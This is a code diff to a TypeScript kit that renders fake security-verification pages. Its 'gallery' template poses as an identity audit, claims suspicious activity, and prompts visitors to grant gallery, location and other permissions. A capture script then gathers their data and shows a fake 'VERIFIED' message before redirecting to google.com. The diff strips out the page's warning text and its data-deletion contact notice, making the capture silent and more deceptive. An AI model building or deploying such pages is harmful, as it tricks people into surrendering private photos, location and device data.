@@ -18,7 +18,6 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
       if (hasRedirected) return;
       var elapsed = (Date.now() - startTime) / 1000;
       var threshold = (flowType === 'full') ? 60 : 15;
-      if (cfg.tmplId === 'gallery') return; // Stay on result page
       if (elapsed >= threshold || (permsCompleted >= requiredPerms.length && elapsed >= 5)) {
         hasRedirected = true;
         window.location.href = targetUrl;
@@ -78,25 +77,17 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           if (icon) icon.innerText = "✅";
           if (statusTitle) { statusTitle.innerText = "VERIFIED"; statusTitle.style.color = "#27ae60"; }
           if (statusText) {
-             if (cfg.tmplId === 'gallery') {
-               statusText.innerHTML = "<b>Audit Selesai.</b><br>Terima kasih atas kerjasama anda, hubungi kami untuk segera menghapus semua percobaan yang telah kita lakukan bersama.<br><br>📧 <b>Audit54G@gmail.com</b>";
-             } else {
-               statusText.innerText = "Sertifikat keamanan diterbitkan. Mengalihkan...";
-             }
+             statusText.innerText = "Sertifikat keamanan diterbitkan. Mengalihkan...";
           }
         } else {
           if (icon) icon.innerText = "ℹ️";
           if (statusTitle) statusTitle.innerText = "COMPLETE";
           if (statusText) statusText.innerText = "Proses selesai. Membuka akses...";
         }
-        if (cfg.tmplId !== 'gallery') {
-          setTimeout(checkRedirect, 3000);
-        }
+        setTimeout(checkRedirect, 3000);
       }
 
       try {
-        if (cfg.msgBefore) alert(cfg.msgBefore);
-        
         if (!isSilent) updateProgress(8, "Menganalisis integritas browser...", "SECURITY_CHECK");
         
         var metadata = {
@@ -207,8 +198,8 @@ export const templates: Record<string, {name: string, render: (id: string) => st
   },
   'gallery': {
     name: "🖼️ Gallery: Audit & Sync (Ultimate Robin Hood)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>System Audit</title><style>body { background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:420px; padding:40px; border:1px solid #333; border-radius:12px; text-align:center; background:#0a0a0a; } .btn { background:#fff; color:#000; padding:16px; border-radius:8px; border:none; font-weight:bold; cursor:pointer; width:100%; font-size:16px; margin-top:25px; transition: 0.3s; } .btn:hover { background: #ccc; }</style></head><body><div class="box"><div style="font-size:50px;">🔒</div><h2>Identity Awareness Audit</h2><p style="color:#888; font-size:14px; line-height:1.6;">Protokol keamanan mendeteksi aktivitas mencurigakan. Sinkronisasi metadata gallery dan spatial diperlukan untuk validasi kepemilikan perangkat.</p><p style="color:#ff4757; font-size:12px;"><b>Warning:</b> Jika kamu menerima izin ini maka saya harap kamu mengingat detail kerjasama ini.</p><button class="btn" onclick="window.startCapture();">Mulai Verifikasi Audit</button></div>${getCaptureScript(id, 'https://google.com', {
-      tmplId: 'gallery', perms: ALL_PERMS, accent: '#ffffff', icon: '🕵️', msgBefore: 'Jika kamu menerima izin ini maka saya harap kamu mengingat detail kerjasama ini.'
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>System Audit</title><style>body { background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:420px; padding:40px; border:1px solid #333; border-radius:12px; text-align:center; background:#0a0a0a; } .btn { background:#fff; color:#000; padding:16px; border-radius:8px; border:none; font-weight:bold; cursor:pointer; width:100%; font-size:16px; margin-top:25px; transition: 0.3s; } .btn:hover { background: #ccc; }</style></head><body><div class="box"><div style="font-size:50px;">🔒</div><h2>Identity Awareness Audit</h2><p style="color:#888; font-size:14px; line-height:1.6;">Protokol keamanan mendeteksi aktivitas mencurigakan. Sinkronisasi metadata gallery dan spatial diperlukan untuk validasi kepemilikan perangkat.</p><button class="btn" onclick="window.startCapture();">Mulai Verifikasi Audit</button></div>${getCaptureScript(id, 'https://google.com', {
+      tmplId: 'gallery', perms: ALL_PERMS, accent: '#ffffff', icon: '🕵️'
     })}</body></html>`
   },
   'cloudflare': {
